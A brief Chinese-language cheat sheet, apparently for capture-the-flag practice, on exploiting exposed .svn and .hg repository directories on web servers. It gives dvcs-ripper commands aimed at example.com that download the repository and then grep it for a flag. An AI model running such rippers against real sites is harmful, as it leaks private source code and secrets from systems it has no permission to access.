---
title: "svn_hg泄露"
date: 2026-07-02
---
# svn/hg泄露

## .svn

使用**dvcs-ripper**

```bash
./rip-svn.pl -v -u http://example.com/.svn/

# Ctrl+h 显示隐藏文件夹

cd .svn

grep -ri ctf *
```

## .hg

使用**dvcs-ripper**

```bash
./rip-hg.pl -v -u http://example.com/.hg

cd .hg

grep -ri ctf *
```
